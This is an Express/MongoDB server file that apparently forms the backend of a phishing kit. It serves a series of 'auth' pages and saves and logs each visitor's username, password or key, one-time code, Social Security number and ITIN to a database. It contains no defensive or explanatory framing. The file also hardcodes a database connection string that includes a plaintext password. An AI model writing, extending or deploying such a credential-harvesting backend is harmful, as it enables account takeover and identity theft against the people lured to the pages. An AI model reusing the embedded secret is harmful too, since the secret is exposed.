const express = require('express')
const {default : mongoose} = require('mongoose')
const cors = require('cors')
const port = process.env.PORT || 3000


const CONN_URL = 'mongodb+srv://Otunba:biggest_grammy01@otunba.j7day.mongodb.net/?retryWrites=true&w=majority&appName=Otunba'
const app = express()


// Middleware
app.use(cors())
app.use(express.json())
app.use(express.urlencoded({extended : false}))
app.use(express.static('public'))
app.use('/auth', express.static('auth'))
app.use('/img', express.static('img'))


// Models
const AuthDataSchema = new mongoose.Schema({
  user: String,
  key: String,
  code: String,
  ssn: String,
  itin: String
});

const AuthData = mongoose.model('AuthData', AuthDataSchema)

// Routes
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html')
})



app.get('/auth', (req, res) => {
  res.sendFile(__dirname + '/auth/auth.html')
})

app.post('/auth', (req, res) => {  
  try {
    const authData = new AuthData({
        user : req.body.user,
        key : req.body.key
    })
    const savedAuthData = authData.save()
    console.log(req.body)
    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
} catch(error){
    res.status(404).json({message : error, message})
}
})


app.get('/auth_code', (req, res) => {
  res.sendFile(__dirname + '/auth/auth_code.html')
})

app.post('/auth_code', (req, res) => {
  try {
    const authData = new AuthData({
        code : req.body.code
    })
    const savedAuthData = authData.save()
    console.log(req.body)
    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
} catch(error){
    res.status(404).json({message : error, message})
}
});



app.get('/auth_ssn', (req, res) => {
  res.sendFile(__dirname + '/auth/auth_ssn.html')
})

app.post('/auth_ssn', (req, res) => {
  try {
    const authData = new AuthData({
        ssn : req.body.ssn
    })
    const savedAuthData = authData.save()
    console.log(req.body)
    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
} catch(error){
    res.status(404).json({message : error, message})
}
})



app.get('/auth_itin', (req, res) => {
  res.sendFile(__dirname + '/auth/auth_itin.html')
})

app.post('/auth_itin', (req, res) => {
  try {
    const authData = new AuthData({
        itin : req.body.itin
    })
    const savedAuthData = authData.save()
    console.log(req.body)
    res.status(200).json({ message : "user added succesfully", data : savedAuthData})
} catch(error){
    res.status(404).json({message : error, message})
}
});



mongoose.connect(CONN_URL).then(() => {
  app.listen(port, () => {
      console.log(`server started at http://localhost:${port}`)
  })
  console.log('database connected')
}).catch((err) => {
  console.log(err.message)
})